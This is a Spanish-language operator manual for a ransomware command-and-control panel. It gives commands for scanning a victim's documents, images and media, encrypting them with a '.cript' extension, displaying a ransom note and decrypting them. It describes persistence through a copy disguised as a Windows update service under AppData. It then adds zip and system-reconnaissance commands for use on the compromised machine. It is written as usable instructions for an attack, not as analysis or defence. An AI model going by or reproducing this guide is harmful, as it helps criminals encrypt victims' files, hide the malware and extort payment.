# 📖 Manual de Operaciones - Terminal Remota C2

## 🔧 Comandos desde la Consola Interactiva

### 1. Escaneo de Archivos
El escaneo busca archivos con extensiones específicas en el directorio actual.

**Desde el Dashboard:** Usa el botón "Escanear Archivos" en la sección de Archivos.

**Desde la Terminal Remota (Shell):**
```cmd
c2:scan
```

**Alternativa con CMD:**
```cmd
dir /s *.doc *.docx *.pdf *.txt *.xls *.xlsx *.jpg *.png
```

---

### 2. Cifrado de Archivos
Cifra los primeros 100 archivos encontrados (límite configurable).

**Desde el Dashboard:** Usa el botón "Cifrar Archivos" en la sección de Archivos.

**Desde la Terminal Remota (Shell):**
```cmd
c2:encrypt        # Cifra hasta 100 archivos
c2:encrypt 50     # Cifra hasta 50 archivos
c2:encrypt 200    # Cifra hasta 200 archivos
```

Los archivos cifrados tendrán la extensión `.cript` añadida.

---

### 3. Mostrar Nota de Rescate
Muestra la ventana de rescate en la víctima.

**Desde el Dashboard:** Usa el botón "Mostrar Nota" en la sección de Archivos.

**Desde la Terminal Remota (Shell):**
```cmd
c2:ransom
```

**Requisito:** El archivo `nota_rescate.exe` debe estar en:
```
C:\Users\[Usuario]\AppData\Roaming\WindowsUpdate\nota_rescate.exe
```

---

### 4. Descifrado de Archivos
Restaura los archivos cifrados a su estado original.

**Desde el Dashboard:** Usa el botón "Descifrar Archivos" en la sección de Archivos.

Busca todos los archivos `.cript` y los restaura.

---

## 📦 Comandos ZIP (Compresión)

### Comprimir archivos en ZIP
Usando PowerShell desde la Terminal Remota:

**Comprimir un archivo:**
```cmd
powershell Compress-Archive -Path "C:\ruta\archivo.txt" -DestinationPath "C:\ruta\archivo.zip"
```

**Comprimir varios archivos:**
```cmd
powershell Compress-Archive -Path "C:\ruta\archivo1.txt","C:\ruta\archivo2.txt" -DestinationPath "C:\ruta\archivos.zip"
```

**Comprimir una carpeta completa:**
```cmd
powershell Compress-Archive -Path "C:\ruta\carpeta\*" -DestinationPath "C:\ruta\carpeta.zip"
```

**Agregar archivos a un ZIP existente:**
```cmd
powershell Compress-Archive -Path "C:\ruta\nuevo.txt" -Update -DestinationPath "C:\ruta\archivo.zip"
```

---

### Descomprimir archivos ZIP

**Extraer a una carpeta específica:**
```cmd
powershell Expand-Archive -Path "C:\ruta\archivo.zip" -DestinationPath "C:\ruta\destino"
```

**Extraer sobrescribiendo archivos existentes:**
```cmd
powershell Expand-Archive -Path "C:\ruta\archivo.zip" -DestinationPath "C:\ruta\destino" -Force
```

---

## 🔍 Comandos Útiles de Navegación

| Comando | Descripción |
|---------|-------------|
| `dir` | Lista archivos del directorio actual |
| `cd ..` | Subir un nivel |
| `cd C:\ruta` | Ir a un directorio específico |
| `cd %USERPROFILE%\Desktop` | Ir al escritorio del usuario |
| `tree` | Mostrar árbol de directorios |
| `type archivo.txt` | Ver contenido de un archivo |
| `del archivo.txt` | Eliminar un archivo |
| `mkdir carpeta` | Crear una carpeta |
| `rmdir /s /q carpeta` | Eliminar carpeta y contenido |
| `copy origen destino` | Copiar archivo |
| `move origen destino` | Mover archivo |
| `rename viejo nuevo` | Renombrar archivo |

---

## 💻 Comandos de Información del Sistema

| Comando | Descripción |
|---------|-------------|
| `ipconfig` | Ver configuración de red |
| `systeminfo` | Información del sistema |
| `whoami` | Usuario actual |
| `hostname` | Nombre del equipo |
| `tasklist` | Procesos en ejecución |
| `netstat -an` | Conexiones de red |

---

## ⚠️ Notas Importantes

1. **Directorio de cifrado:** El cifrado ahora opera en el directorio donde se ejecute el cliente (`process.cwd()`).

2. **Persistencia:** El cliente se copia automáticamente a:
   `%APPDATA%\WindowsUpdate\WindowsUpdateService.exe`

3. **Timeout:** Los comandos tienen un límite de 2 minutos antes de marcar timeout.

4. **Extensiones objetivo:**
   - Documentos: doc, docx, pdf, txt, xls, xlsx, pptx
   - Imágenes: jpg, png
   - Media: mp3, mp4



Comandos C2 disponibles:

Comando	Descripción
c2:help	Ver todos los comandos disponibles
c2:scan	Escanear archivos en el directorio actual
c2:encrypt	Cifrar hasta 100 archivos
c2:encrypt 50	Cifrar hasta 50 archivos
c2:decrypt	Descifrar archivos .cript
c2:ransom	Mostrar nota de rescate